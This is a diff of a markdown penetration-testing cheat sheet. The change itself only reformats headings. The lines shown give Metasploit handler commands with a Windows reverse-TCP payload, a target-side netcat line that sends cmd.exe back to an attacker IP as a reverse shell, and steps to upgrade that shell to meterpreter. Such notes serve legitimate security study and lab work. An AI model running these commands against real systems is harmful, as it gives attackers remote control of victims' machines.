@@ -110,15 +110,15 @@ See [msfvenom cheat sheet](http://thor-sec.com/cheatsheet/msfvenom_cheat_sheet/)
 `session -i 1` ---puts you back into your session
 
 #### Turn a regular shell into a meterpreter shell    
-#####    Attacker  
+* #####  Attacker  
 - `use exploit/multi/handler`  
 - `set payload windows/shell/reverse_tcp`  
 - `set lhost <IP>`  
 - `set lport <PORT>`  
 - `run`  
-##### Target  
+* ##### Target  
 - `nc -vn <IP> <PORT> -e cmd.exe`  
-##### Attacker  
+* ##### Attacker  
 - Ctrl+Z (to background session)
 - `sessions -l` (this will list your sessions to verify which one it is)
 - `setg rhost <IP>`  
